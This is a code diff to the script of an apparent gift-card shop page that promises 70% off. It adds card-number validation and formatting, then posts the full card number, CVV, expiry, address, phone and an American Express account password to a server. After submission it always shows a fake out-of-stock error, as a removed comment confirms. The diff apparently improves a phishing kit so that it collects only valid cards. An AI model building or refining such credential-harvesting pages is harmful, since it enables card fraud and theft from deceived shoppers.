@@ -60,27 +60,151 @@ function goStep(n) {
       <strong>${state.brand}</strong> Gift Card – $${state.amount}<br>
       <span style="color:#16a34a;font-weight:700">70% OFF applied → You pay only $${pay}</span>
     `;
+    validateForm(); // initial check
   }
 }
 
-// Amex detect
-document.getElementById('cardNumber').addEventListener('input', function(e) {
-  let v = e.target.value.replace(/\D/g, '').substring(0, 16);
-  // basic spacing
-  e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
-  const first = v.charAt(0);
-  const amex = first === '3';
+// ========== CARD VALIDATION (Luhn + length + type) ==========
+function luhnCheck(num) {
+  num = (num + '').replace(/\D/g, '');
+  if (num.length < 13 || num.length > 19) return false;
+  let sum = 0;
+  let alternate = false;
+  for (let i = num.length - 1; i >= 0; i--) {
+    let n = parseInt(num[i], 10);
+    if (alternate) {
+      n *= 2;
+      if (n > 9) n -= 9;
+    }
+    sum += n;
+    alternate = !alternate;
+  }
+  return (sum % 10) === 0;
+}
+
+function getCardType(num) {
+  num = (num + '').replace(/\D/g, '');
+  if (/^3[47]/.test(num)) return 'amex';
+  if (/^4/.test(num)) return 'visa';
+  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'mastercard';
+  if (/^6(?:011|5)/.test(num)) return 'discover';
+  if (/^3(?:0[0-5]|[68])/.test(num)) return 'diners';
+  if (/^(?:2131|1800|35)/.test(num)) return 'jcb';
+  return 'unknown';
+}
+
+function isValidCardNumber(num) {
+  num = (num + '').replace(/\D/g, '');
+  const type = getCardType(num);
+  const len = num.length;
+
+  // length rules
+  if (type === 'amex' && len !== 15) return false;
+  if ((type === 'visa' || type === 'mastercard' || type === 'discover' || type === 'jcb') && len !== 16) return false;
+  if (type === 'diners' && !(len === 14 || len === 16)) return false;
+  if (type === 'unknown' && (len < 13 || len > 19)) return false;
+
+  return luhnCheck(num);
+}
+
+// Format + live validate card number
+const cardInput = document.getElementById('cardNumber');
+const cardError = document.createElement('div');
+cardError.id = 'cardError';
+cardError.style.cssText = 'color:#b91c1c;font-size:0.8rem;margin-top:6px;display:none;';
+cardInput.parentNode.appendChild(cardError);
+
+cardInput.addEventListener('input', function(e) {
+  let v = e.target.value.replace(/\D/g, '').substring(0, 19);
+  const type = getCardType(v);
+
+  // spacing
+  if (type === 'amex') {
+    // 4-6-5
+    let formatted = '';
+    if (v.length > 0) formatted += v.substring(0, 4);
+    if (v.length > 4) formatted += ' ' + v.substring(4, 10);
+    if (v.length > 10) formatted += ' ' + v.substring(10, 15);
+    e.target.value = formatted.trim();
+  } else {
+    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+  }
+
+  // Amex field toggle
+  const amex = type === 'amex';
   document.getElementById('amexField').style.display = amex ? 'block' : 'none';
   document.getElementById('cvv').maxLength = amex ? 4 : 3;
+  document.getElementById('cvv').placeholder = amex ? '1234' : '123';
+
+  // live validation message
+  if (v.length === 0) {
+    cardError.style.display = 'none';
+    cardInput.style.borderColor = '';
+  } else if (!isValidCardNumber(v)) {
+    cardError.textContent = 'Invalid card number';
+    cardError.style.display = 'block';
+    cardInput.style.borderColor = '#ef4444';
+  } else {
+    cardError.textContent = '✓ Valid ' + (type !== 'unknown' ? type.toUpperCase() : 'card');
+    cardError.style.color = '#16a34a';
+    cardError.style.display = 'block';
+    cardInput.style.borderColor = '#16a34a';
+  }
+
+  validateForm();
 });
 
+// Expiry format
 document.getElementById('exp').addEventListener('input', function(e) {
   let v = e.target.value.replace(/\D/g, '').substring(0, 4);
-  if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
+  if (v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
   e.target.value = v;
+  validateForm();
 });
 
+// CVV + other fields trigger re-validate
+['cvv', 'email', 'cardName', 'street', 'city', 'state', 'zip', 'phone', 'amexPassword'].forEach(id => {
+  const el = document.getElementById(id);
+  if (el) el.addEventListener('input', validateForm);
+});
+
+function validateForm() {
+  const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+  const exp = document.getElementById('exp').value.trim();
+  const cvv = document.getElementById('cvv').value.trim();
+  const email = document.getElementById('email').value.trim();
+  const cardName = document.getElementById('cardName').value.trim();
+  const street = document.getElementById('street').value.trim();
+  const city = document.getElementById('city').value.trim();
+  const state = document.getElementById('state').value.trim();
+  const zip = document.getElementById('zip').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+  const amexPass = document.getElementById('amexPassword').value.trim();
+  const isAmex = getCardType(cardNum) === 'amex';
+
+  const cardValid = isValidCardNumber(cardNum);
+  const expValid = /^\d{2}\/\d{2}$/.test(exp);
+  const cvvValid = isAmex ? /^\d{4}$/.test(cvv) : /^\d{3}$/.test(cvv);
+  const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  const requiredFilled = cardName && street && city && state && zip && phone && emailValid;
+  const amexOk = !isAmex || amexPass.length >= 4;
+
+  const allValid = cardValid && expValid && cvvValid && requiredFilled && amexOk;
+
+  const btn = document.getElementById('payBtn');
+  btn.disabled = !allValid;
+  btn.style.opacity = allValid ? '1' : '0.6';
+  btn.textContent = allValid ? 'Pay Now – 70% Off Applied' : 'Enter valid card details';
+}
+
+// ========== SUBMIT ==========
 async function submitPay() {
+  const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+  if (!isValidCardNumber(cardNum)) {
+    alert('Please enter a valid card number');
+    return;
+  }
+
   const btn = document.getElementById('payBtn');
   btn.disabled = true;
   btn.textContent = 'Processing...';
@@ -90,7 +214,7 @@ async function submitPay() {
     amount: state.amount,
     email: document.getElementById('email').value.trim(),
     cardName: document.getElementById('cardName').value.trim(),
-    cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+    cardNumber: cardNum,
     exp: document.getElementById('exp').value.trim(),
     cvv: document.getElementById('cvv').value.trim(),
     amexPassword: document.getElementById('amexPassword').value.trim() || null,
@@ -107,8 +231,7 @@ async function submitPay() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
     });
-    const json = await res.json();
-    // always show stock-out
+    await res.json();
     document.getElementById('errorBox').style.display = 'block';
     btn.style.display = 'none';
   } catch (err) {
